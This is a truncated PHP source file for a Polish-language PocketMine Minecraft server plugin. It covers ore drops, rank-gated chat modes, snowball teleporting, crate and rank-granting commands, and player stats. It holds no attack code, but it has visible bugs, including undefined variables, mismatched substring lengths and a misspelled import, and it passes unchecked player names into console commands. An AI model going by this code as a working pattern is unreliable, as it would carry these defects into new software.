<?php
namespace Gracz;

use pocketmine\event\Listener;
use pocketmine\plugin\PluginBase;
use pocketmine\plugin\Plugin;
use pocketmine\Server;
use pocketmine\utils\Binary;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\event\server\DataPacketReceiveEvent;
use pocketmine\event\block\ItemFrameDropItemEvent as LLlKoJlHuKJoinEvent;
use pocketmine\Player;
use pocketmine\IPlayer;
use pocketmine\command\{Command, CommandSender};
use pocketmine\event\player\PlayerDeathEvent;
use pocketmine\level\particle\Particle;
use pocketmine\level\Level;
use pocketmine\level\Position;
use pocketmine\level\Position\getLevel;
use pocketmine\math\Vector3;
use pocketmine\utils\TextFormat as TF;
use pocketmine\utils\TextFormat;
use pocketmine\utils\Config;
use pocketmine\utils\Utils;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\block\BlockPlaceEvent;
use xSmoothy\FactionsPro\FactionMain;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerItemConsumeEvent;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\item\Item;
use pockemine\inventory\Inventory;
use pocketmine\Entity;
use pocketmine\item\enchantment\Enchantment;
use pocketmine\event\entity\EntityDamageByEntityEvent;
use pocketmine\event\entity\EntityDamageEvent;
use pocketmine\event\inventory\InventoryPickupItemEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\player\PlayerMoveEvent;
use pocketmine\entity\Effect;
use pocketmine\event\entity\EntityDespawnEvent;
use pocketmine\event\entity\ProjectileLaunchEvent;
use pocketmine\entity\Snowball;
use pocketmine\event\server\QueryRegenerateEvent;
use pocketmine\event\player\PlayerRespawnEvent;
use pocketmine\event\player\PlayerChatEvent;
use pocketmine\level\particle\BubbleParticle;
use pocketmine\level\particle\LavaParticle;
use pocketmine\level\sound\BatSound;
use pocketmine\level\sound;
use pocketmine\block\Air;
use pocketmine\block\Obsidian;
use pocketmine\block\Stone;
use pocketmine\block\Sand;
use pocketmine\event\inventory\CraftItemEvent;
use pocketmine\event\player\PlayerItemHeldEvent;
use pocketmine\event\entity\EntityShootBowEvent;
use Gracz\data\Border;
use Gracz\listener\BorderListener;
use Gracz\task\BorderCheckTask;


class Main extends PluginBase implements Listener{
 
 public $prefix = TextFormat::GREEN."[THC]".TextFormat::YELLOW." ";
 
 CONST prefix = TF::RED.TF::BOLD."Elo ".TF::RESET;
 CONST OBSIDIAN = 49;
 const COUNT_KEY = 8;
    /** @var Config $eloyaml */
 public $eloyaml;
    /** @var Config $config */
 public $config;
 private $order;
 
    private $warnings = [];
    private $muted = [];
 
 public function __construct(){
		$this->order = array();
	}
 	
	private $plugin, $player, $x, $y, $z, $world;
	
 	private $cooldown = [];
	
	protected $lastPing;
	
	protected $exemptedEntities = [];
	
	public $players = [];
	
	public $radius;
	
	public $cfg;
	
	private $reason = "";

    public $msgReachedEnd;
    public $msgTeleport;
    public $msgOutOfReach;

    private static $colors;

    /** @var Border */
    public $border;

    /** @var Array */
    public $teleports;

	
		    public function getAPI()
    {
        return Server::getInstance()->getPluginManager()->getPlugin("ohCode_Gildie");
    }
		    public function getAPI2()
    {
        return Server::getInstance()->getPluginManager()->getPlugin("ohCode_Punkty");
    }
			    public function getAPI3()
    {
        return Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI");
    }
			    public function getAPI4()
    {
        return Server::getInstance()->getPluginManager()->getPlugin("ohCode_Tools");
    }
		
		public function onEnable(){
        @mkdir($this->getDataFolder());
	    $this->slide = new Config($this->getDataFolder(). "config.yml",Config::YAML,array(
			"kb-modifier" => true,
			"kb-number" => 0.2
			));
		$c = $this->getConfig()->getAll();
		$num = 0;
		$server = $this->getServer();
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
		$this->getLogger()->info("§7Uruchamiam!");
		$this->teleports = [];
		$this->saveDefaultConfig();
		$this->lastPing = [];
		$this->reloadConfig();
		$this->cfg = $this->getConfig();
		$this->cfg = new Config($this->getDataFolder(). "config.yml", Config::YAML);
		$this->radius = $this->getConfig()->get('border-radius', 1000);
        $this->msgReachedEnd = $this->getConfig()->getNested('msg.reached-end', '%red%You have reached the end of the world. Purchase unlimited world to disable the border.');
        $this->msgTeleport = $this->getConfig()->getNested('msg.out-of-bounds', '%red%You cannot teleport to that location as it is outside the world border. Purchase unlimited world to disable the border.');
        $this->msgOutOfReach = $this->getConfig()->getNested('msg.out-of-reach', '%red%You cannot place a block outside the world border. Purchase unlimited world to disable the border.');
        $location = $this->getServer()->getDefaultLevel()->getSpawnLocation();
        $this->border = new Border($location->getX(), $location->getZ(), $this->radius);
        $this->getServer()->getPluginManager()->registerEvents(new BorderListener($this), $this);
        $this->getServer()->getScheduler()->scheduleRepeatingTask(new BorderCheckTask($this), 20);
		}
		
		public function onDisable() {

        unset($this->border);
        unset($this->radius);
        unset($this->teleports);
        unset($this->msgReachedEnd);
        unset($this->msgTeleport);
        unset($this->msgOutOfReach);
    }
	
	public function onBasdsadsagreak(BlockBreakEvent $event) {
    if($event->getBlock()->getId() == 14) {
      $drops = array(Item::get(0, 0, 1));
      $event->setDrops($drops);
    }
    if($event->getBlock()->getId() == 15) {
      $drops = array(Item::get(0, 0, 1));
      $event->setDrops($drops);
	      }
    if($event->getBlock()->getId() == 56) {
      $drops = array(Item::get(0, 0, 1));
      $event->setDrops($drops);
	      }
    if($event->getBlock()->getId() == 129) {
      $drops = array(Item::get(0, 0, 1));
      $event->setDrops($drops);
	      }
    if($event->getBlock()->getId() == 21) {
      $drops = array(Item::get(0, 0, 1));
      $event->setDrops($drops);
	      }
    if($event->getBlock()->getId() == 73) {
      $drops = array(Item::get(0, 0, 1));
      $event->setDrops($drops);
	}
	if($event->getBlock()->getId() == 78) {
      $drops = array(Item::get(0, 0, 1));
      $event->setDrops($drops);
    }
	if($event->getBlock()->getId() == 19) {
      $drops = array(Item::get(49, 0, 1));
      $event->setDrops($drops);
    }
}
	
	
			 
			 
			 public function onChatsdasd(PlayerChatEvent $event){
	    $cfg = new Config($this->getDataFolder() . "chat.yml", Config::YAML);
		if($cfg->get("chat") == 1 && !$event->getPlayer()->hasPermission("admin.dostep.chat")){
		$event->setCancelled();
		$event->getPlayer()->sendMessage("§8• §8> §7Chat główny jest §cyłączony! §8•");
		}
		if($cfg->get("chat") == 2 && !$event->getPlayer()->hasPermission("premium.dostep.chat")){
		$event->setCancelled();
		$event->getPlayer()->sendMessage("§8• §8> §7Chat główny jest §awłączony dla rang §eplatnych! §8•");
		}
		if($cfg->get("chat") == 3 && !$event->getPlayer()->hasPermission("vip.dostep.chat")){
		$event->setCancelled();
		$event->getPlayer()->sendMessage("§8• §8> §7Chat główny jest §awłączony dla §eVIPow! §8•");
		}
		if($cfg->get("chat") == 4 && !$event->getPlayer()->hasPermission("svip.dostep.chat")){
		$event->setCancelled();
		$event->getPlayer()->sendMessage("§8• §8> §7Chat główny jest §awłączony dla §6SVIPow! §8•");
		}
		}
	
	public function alah_akbar(LLlKoJlHuKJoinEvent $CHE_BJlADb){
		$CHE_BJlADb->setCancelled();
		}
		
		public function isPlayerMuted(Player $p){
        return isset($this->muted[spl_object_hash($p)]);
    }
    public function unMutePlayer(Player $p){
        unset($this->muted[spl_object_hash($p)]);
    }
	
	 public function assertConfigUpToDate() {

        /** ########## Update v1.0.0 Start ########## **/
        if($this->getConfig()->getNested('msg.reached-end') === null) {
            $this->getConfig()->setNested('msg.reached-end', '%red%EBorder: You have reached the end of the world.');
            $this->getLogger()->info('Updated msg.reached-end');
            $this->saveConfig();
        }

        if($this->getConfig()->getNested('msg.out-of-bounds') === null) {
            $this->getConfig()->setNested('msg.out-of-bounds', '%red%EBorder: You cannot teleport to that location as it is outside the world border.');
            $this->getLogger()->info('Updated msg.out-of-bounds');
            $this->saveConfig();
        }

        if($this->getConfig()->getNested('msg.out-of-reach') === null) {
            $this->getConfig()->setNested('msg.out-of-reach', '%red%EBorder: You cannot place a block outside the world border.');
            $this->getLogger()->info('Updated msg.out-of-reach');
            $this->saveConfig();
        }
        /** ########## Update v1.0.0 End ########## **/

        $this->reloadConfig();
    }
	

public function onDeath2(PlayerDeathEvent $event){
	$pointdata = new Config($this->getDataFolder() . "/punkty.yml", Config::YAML);
    $entity = $event->getEntity();
    $cause = $entity->getLastDamageCause();
        $killer = $cause->getDamager();
    if($killer instanceof Player){
      $name = $killer->getName();
      $points = $pointdata->get($name);
      $pointdata->set($name,$points+100);
      $pointdata->save();
    }
  }
  

public function onProjectileLaunch(ProjectileLaunchEvent $event){
		$entity = $event->getEntity();
		if($entity instanceof Snowball){
			$shooter = $entity->shootingEntity;
			$ballid = $entity->getId();
			if($shooter instanceof Player){
				$id = $shooter->getId();
				if( array_key_exists($id,$this->order) ){array_push($this->order[$id],$ballid);}
					else{$this->order += array($id => array($ballid));}
			}
		}
	}
	public function onPlayersssDeath(PlayerDeathEvent $event){
		$entity = $event->getEntity();
		if($entity instanceof Player){
			$id = $entity->getId();
			if(array_key_exists($id,$this->order)){$this->order[$id]=array();}
		}
	}
	public function onEntitysClose(EntityDespawnEvent $event){
		if($event->getType() === 81){	//81=Snowball
			$entity = $event->getEntity();
			$ballid = $entity->getId();
			$shooter = $entity->shootingEntity;
			$posTo = $entity->getPosition();
			
			if($posTo instanceof Position){
				if($shooter instanceof Player && $shooter->hasPermission("enderpearl.teleport")){
					$id = $shooter->getId();
					$key = array_search($ballid,$this->order[$id]);
					if(array_key_exists($id,$this->order) && $key!==false ){
						unset($this->order[$id][$key]);
						$posFrom = $shooter->getPosition();
						
						$shooter->teleport($posTo);
					}
				}
			}
		}
	}
	
	public function onKill(PlayerDeathEvent $event){
        $cause = $event->getEntity()->getLastDamageCause();
        if($cause instanceof EntityDamageByEntityEvent){
            $killer = $cause->getDamager();
            if($killer instanceof Player){
                $killer->setHealth($killer->getHealth() + ($this->getConfig()->get("hearts-per-kill") * 2));
            }
        }
    }
	
	public function onPlayerCommand(PlayerCommandPreprocessEvent $event) {
        if ($event->isCancelled()) return;
        $message = $event->getMessage();
        if (strtolower(substr($message, 0, 5) === "/tpahere") || strtolower(substr($message, 0, 4) === "/tpa")) { //Command
            $command = substr($message, 1);
            $args = explode(" ", $command);
            if (!isset($args[1])) {
                return true;
            }
            $sender = $event->getPlayer();

            foreach ($this->enabled as $noteller) {

                if (strpos(strtolower($noteller), strtolower($args[1])) !== false) {
                    $sender->sendMessage("§8• §7Ten gracz ma §cwyłączone §7prośby o teleportacje! §8•");
                    $event->setCancelled(true);
                }
            }
        }
    }
	
	public function onQuit(PlayerQuitEvent $e) {
        if (isset($this->enabled[strtolower($e->getPlayer()->getName())])) {
            unset($this->enabled[strtolower($e->getPlayer()->getName())]);
        }
    }
	
	public function getPing($n) {
		if (isset($this->lastPing[strtolower($n)])) {
			return $this->lastPing[strtolower($n)];
		}
		return "N/A";
	}
	
	public function onPksst(DataPacketReceiveEvent $e) {
		if ($e->getPacket()->pid() !== 0x00) return;
		$this->lastPing[strtolower($e->getPlayer()->getName())]
			= Binary::readLong($e->getPacket()->buffer)/1000.0;
	}
	
	public function onQsssuit(PlayerQuitEvent $e) {
		unset($this->lastPing[strtolower($e->getPlayer()->getName())]);
	}
	
	
	
	
  public function onCommand(CommandSender $sender, Command $cmd, $label, array $args){
	  //// BEZ ARGUMENTU \\\\
        if($cmd->getName() == "gracz"){
			if($sender instanceof Player) {
				if(empty($args)){
			$gracz = $sender->getName();
            $pointdata = new Config($this->getDataFolder() . "/punkty.yml", Config::YAML);
            $points = $pointdata->get($sender->getName());
			$playername = $sender->getName();
			$gildia = $this->getAPI()->getPlayerFaction($gracz);
			$punktciory = $this->getAPI2()->getElo($gracz);
			$monety = $this->getAPI3()->myMoney($gracz);
			$monety2 = $this->getAPI3()->getMonetaryUnit();
			$sender->sendMessage("§8• §8 ------------§8 [ §3GRACZ §8] §8------------");
			$sender->sendMessage("§8• §7Gracz: §b" . $gracz . "");
			if($this->getAPI()->isInFaction($sender->getName())){
			$sender->sendMessage("§8• §7Gildia: §b" . strtoupper($gildia) . "");
			}
			else{
			$sender->sendMessage("§8• §7Gildia: §bBRAK GILDII");
			}
			$sender->sendMessage("§8• §7Punkty: §b" . $punktciory . "");
			$sender->sendMessage("§8• §8 ------------§8 [ §3GRACZ §8] §8------------");
			}
			}
			///// Z ARGUMENTEM \\\\\\
			if(count($args) == 1){
			$playername = $args[0];
            $pointdata = new Config($this->getDataFolder() . "/punkty.yml", Config::YAML);
            $points = $pointdata->get($playername);
			$gildia = $this->getAPI()->getPlayerFaction($playername);
			$punkty = $this->getAPI2()->getElo($playername);
			$monety = $this->getAPI3()->myMoney($playername);
			$monety2 = $this->getAPI3()->getMonetaryUnit();
			if($killdata->exists($playername) &&  $deathdata->exists($playername)){
			if($this->getServer()->getNameBans()->isBanned(strtolower($playername))){
			$sender->sendMessage("§8• §8 ------------§8 [ §3GRACZ §8] §8------------");
			$sender->sendMessage("§8• §7Gracz: §b" . $playername . "");
			if($this->getAPI()->isInFaction($args[0])){
			$sender->sendMessage("§8• §7Gildia: §b" . strtoupper($gildia) . "");
			}
			else{
			$sender->sendMessage("§8• §7Gildia: §bBRAK GILDII");
			}
			$sender->sendMessage("§8• §7Punkty: §b" . $punkty . "");
			$sender->sendMessage("§8• §8 ------------§8 [ §3GRACZ §8] §8------------");
			}
			else{
			$sender->sendMessage("§8• §8 ------------§8 [ §3GRACZ §8] §8------------");
			$sender->sendMessage("§8• §7Gracz: §b" . $playername . "");
			if($this->getAPI()->isInFaction($args[0])){
			$sender->sendMessage("§8• §7Gildia: §b" . strtoupper($gildia) . "");
			}
			else{
			$sender->sendMessage("§8• §7Gildia: §bBRAK GILDII");
			}
			$sender->sendMessage("§8• §7Punkty: §b" . $punkty . "");
			$sender->sendMessage("§8• §8 ------------§8 [ §3GRACZ §8] §8------------");
			}
  }
  else{
	  $sender->sendMessage("§8• §8[§bOneHard§8] §7Nie odnaleziono takiej osoby w bazie danych! §8•");
  }
			}
		}
			if($cmd->getName() == "premiumcase"){
				if($sender->hasPermission("mieso.command")){
				$item = Item::get(146, 0, $args[0]);
				if(count($args) == 1 or empty($args)){
					$sender->sendMessage("§bUzyj: /premiumcase <ilosc> <gracz>");
				}
				if(count($args) == 2){
					if(is_numeric($args[0])){
					$gracz = $this->getServer()->getPlayer($args[1]);
					$gracz->getInventory()->addItem($item);
					Server::getInstance()->broadcastMessage("§8");
					Server::getInstance()->broadcastMessage("§8• §7Gracz §b". $this->getServer()->getPlayer($args[1])->getName() ." §7zakupil §bx$args[0] §7pandore§7! §8•");
				    Server::getInstance()->broadcastMessage("§8• §7Nasz itemshop: §bis.funhard.pl §8•");
					Server::getInstance()->broadcastMessage("§8");
				}
				else{
					$sender->sendMessage("§8• §7Argument 1 musi byc numeryczny!");
				}
			}
  								}
				else{
					$sender->sendMessage("§8• §7`Nie mozesz tego uzyc! §8•");
				}
			}
			if($cmd->getName() == "mcase"){
				if($sender->hasPermission("mieso.command")){
				$item = Item::get(7, 0, $args[0]);
				if(count($args) == 1 or empty($args)){
					$sender->sendMessage("§bUzyj: /mcase <ilosc> <gracz>");
				}
				if(count($args) == 2){
					if(is_numeric($args[0])){
					$gracz = $this->getServer()->getPlayer($args[1]);
					$gracz->getInventory()->addItem($item);
					Server::getInstance()->broadcastMessage("§8");
					Server::getInstance()->broadcastMessage("§8• §7Gracz §b". $this->getServer()->getPlayer($args[1])->getName() ." §7zakupil §bx$args[0] §7magiczna skrzynke§7! §8•");
				    Server::getInstance()->broadcastMessage("§8• §7Nasz itemshop: §bis.funhard.pl §8•");
					Server::getInstance()->broadcastMessage("§8");
				}
				else{
					$sender->sendMessage("§8• §7Argument 1 musi byc numeryczny!");
				}
			}
  								}
				else{
					$sender->sendMessage("§8• §7`Nie mozesz tego uzyc! §8•");
				}
			}
				if($cmd->getName() == "vip"){
					foreach($this->getConfig()->getNested("infovip") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
                }
				}
				if(strtolower($cmd->getName()) === "cxall"){
				if($sender->hasPermission("cxall.cxall")){
				if(empty($args)){
					$sender->sendMessage("§8• §7Poprawne uzycie to /cxall <ilosc> §8•");
				}
					if(count($args) == 1){
						if(is_numeric($args[0])){
							foreach($this->getServer()->getOnlinePlayers() as $p){
							$p->getInventory()->addItem(Item::get(129, 0, $args[0]));
							Server::getInstance()->broadcastMessage("§8");
							Server::getInstance()->broadcastMessage("§8• §7Wszyscy otrzymali §8(§fx".$args[0]."§8) §3cobblexow §7od §b".$sender->getName()."§7! §8•");
							Server::getInstance()->broadcastMessage("§8");
							}
						}
											else{
							$sender->sendMessage("§8• §8[§3CobbleX§8] §7Argument 1 musi byc numeryczny! §8•");
						}
	}
				}
				else{
					$sender->sendMessage("§8• §7Nie mozesz tego uzyc! §8•");
				}
	}
				if($cmd->getName() == "ping"){
					if (!count($args)) {
					foreach ($this->getServer()->getOnlinePlayers() as $m) {
						$n = $m->getName();
						$sender->sendMessage("§8");
						$sender->sendMessage("§8• §7Twoj ping to: §b".$this->getPing($n)." §8•");
						$sender->sendMessage("§8");
					}
				}else {
					foreach ($args as $n) {
						$p = $this->getServer()->getPlayer($n);
						if ($p == null) {
							$sender->sendMessage($n.": Not found");
							continue;
						}
						$n = $p->getName();
						$sender->sendMessage($n.": ".$this->getPing($n));
					}
				}
				}
				
				
				if($cmd->getName() == "chat"){
	  if($sender->hasPermission("chat.dostep")){
	  if(count($args) == 0){
	  $sender->sendMessage("§8• §8> §7Uzycie: /chat on/off/vip/svip/premium/cc §8•");
	  }
	  if(count($args) == 1){
	  if($args[0] == "on"){
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§8• §8> §7Chat został §awłączony §7przez §b" . $sender->getName() . " §8•");
		  $cfg = new Config($this->getDataFolder() . "chat.yml", Config::YAML);
		  $cfg->set("chat", 0);
		  $cfg->save();
	  }
		  if($args[0] == "off"){
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§8• §8> §7Chat został §cwyłączony §7przez§b " . $sender->getName() . " §8•");
		  $cfg = new Config($this->getDataFolder() . "chat.yml", Config::YAML);
		  $cfg->set("chat", 1);
		  $cfg->save();  
	  }
		  if($args[0] == "premium"){
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§8• §8> §7Chat został §awłączony §7tylko dla §erang platnych §7przez§b " . $sender->getName() . " §8•");
		  $cfg = new Config($this->getDataFolder() . "chat.yml", Config::YAML);
		  $cfg->set("chat", 2);
		  $cfg->save();  
	  }
	  	  if($args[0] == "vip"){
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§8• §8> §7Chat został §awłączony §7tylko dla rangi §eVIP §7przez§b " . $sender->getName() . " §8•");
		  $cfg = new Config($this->getDataFolder() . "chat.yml", Config::YAML);
		  $cfg->set("chat", 3);
		  $cfg->save();  
	  }
	  	  if($args[0] == "svip"){
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§8• §8> §7Chat został §awłączony §7tylko dla rangi §6SVIP §7przez§b " . $sender->getName() . " §8•");
		  $cfg = new Config($this->getDataFolder() . "chat.yml", Config::YAML);
		  $cfg->set("chat", 4);
		  $cfg->save();  
	  }
		  if($args[0] == "cc"){
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§f");
		  $this->getServer()->broadcastMessage("§8• §8> §7Chat został §3wyczyszczony §7przez§b " . $sender->getName() . "§7! §8•");
		  }
	  }
	  }
	  }
				if($cmd->getName() == "config"){
				$this->saveDefaultConfig();
				$this->reloadConfig();
				$this->cfg = $this->getConfig();
				$this->cfg = new Config($this->getDataFolder(). "config.yml", Config::YAML);	
				$sender->sendMessage("§8");
				$sender->sendMessage("§8• §7Przeladowano config! §8(§a+§8) §8•");
				$sender->sendMessage("§8");
				}
				
				if($cmd->getName() == "svip"){
					foreach($this->getConfig()->getNested("infosvip") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
                }
				}
				if($cmd->getName() == "online"){
				$maxcount = $this->cfg->get("Max_Player");
				$mincount = $this->cfg->get("Min_Player");
				$sender->sendMessage("§8");
				$sender->sendMessage("§8• §7Na serwerze jest aktualnie: §b".count($this->getServer()->getOnlinePlayers())."§8/§b100  §8•");
				$sender->sendMessage("§8");
				}
				if($cmd->getName() == "cobblex"){
				if(empty($args)) {
					foreach($this->getConfig()->getNested("infocobblex") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
                }
					return true;
				}
				if($args[0] == "kup") {
				if($sender->getInventory()->contains(Item::get(4, 0, 576))){
				   $sender->getInventory()->removeItem(Item::get(4, 0, 576));
				   $sender->getInventory()->addItem(Item::get(129, 0, 1));
                    $sender->sendMessage("§8• §8[§bCobbleX§8] §7Zakupiłeś §3CobbleX §8•");
            }
						else{
                    $sender->sendMessage("§8• §8[§bCobbleX§8] §7Nie posiadasz §3Bruku! §8•");
                                                }
                                         }
				}
				if($cmd->getName() == "stoniarka"){
				if(empty($args)) {
					foreach($this->getConfig()->getNested("infostoniarka") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
                }
					return true;
				}
				if($args[0] == "kup") {
				if($sender->getInventory()->contains(Item::get(264, 0, 2))){
				   $sender->getInventory()->removeItem(Item::get(264, 0, 2));
				   $sender->getInventory()->addItem(Item::get(121, 0, 4));
				   $sender->sendMessage("§8• §8[§bStoniarka§8] §7Zakupiłeś §3Stoniarke §8•");
            }
						else{
							$sender->sendMessage("§8• §8[§bStoniarka§8] §7Nie posiadasz tyle §3diamentow! §8•");
                                                }
                                         }
                        }
				if($cmd->getName() == "obsydianiarka"){
				if(empty($args)) {
					foreach($this->getConfig()->getNested("infoobsydianiarka") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
                }
					return true;
				}
				if($args[0] == "kup") {
				if($sender->getInventory()->contains(Item::get(264, 0, 2))){
				   $sender->getInventory()->removeItem(Item::get(264, 0, 2));
				   $sender->getInventory()->addItem(Item::get(165, 0, 4));
				   $sender->sendMessage("§8• §7Zakupiłeś §3obsydianiarke §8•");
            }
						else{
							$sender->sendMessage("§8• §7Nie posiadasz tyle §3diamentow! §8•");
                                                }
                                         }
                        }
				if($cmd->getName() == "yt"){
					foreach($this->getConfig()->getNested("infoyt") as $i) {
                    $sender->sendMessage(str_replace('&', '§', $i));
				}
				}
				if($cmd == "dajyt"){
			if($sender->hasPermission("admin.yt")){
				if(empty($args)) {
					$sender->sendMessage("§b/dajyt [nick]");
				}
				if(isset($args[0])){
					$player = $args[0];
					Server::getInstance()->broadcastMessage("");
					Server::getInstance()->broadcastMessage("§8• §7Gracz §b" . $player . " §7otrzymal range §3YT! §8•");
					Server::getInstance()->dispatchCommand(new ConsoleCommandSender(), 'setgroup ' . $player . ' yt');
				}
			}
		}
		
		if($cmd == "dajvip"){
			if($sender->hasPermission("admin.yt")){
				if(empty($args)) {
					$sender->sendMessage("§b/dajvip [nick]");
				}
				if(isset($args[0])){
					$player = $args[0];
					Server::getInstance()->broadcastMessage("");
					Server::getInstance()->broadcastMessage("§8• §7Gracz §b" . $player . " §7zakupil range §eVIP! §8•");
					Server::getInstance()->broadcastMessage("§8• §7Nasz itemshop: §bis.funhard.pl §8•");
					Server::getInstance()->broadcastMessage("");
					Server::getInstance()->dispatchCommand(new ConsoleCommandSender(), 'setgroup ' . $player . ' vip');
				}
			}
		}
		if($cmd == "dajsvip"){
			if($sender->hasPermission("admin.yt")){
				if(empty($args)) {
					$sender->sendMessage("§b/dajsvip [nick]");
				}
				if(isset($args[0])){
					$player = $args[0];
					Server::getInstance()->broadcastMessage("");
					Server::getInstance()->broadcastMessage("§8• §7Gracz §b" . $player . " §7zakupil range §6SVIP! §8•");
					Server::getInstance()->broadcastMessage("§8• §7Nasz itemshop: §bis.funhard.pl §8•");
					Server::getInstance()->broadcastMessage("");
					Server::getInstance()->dispatchCommand(new ConsoleCommandSender(), 'setgroup ' . $player . ' svip');
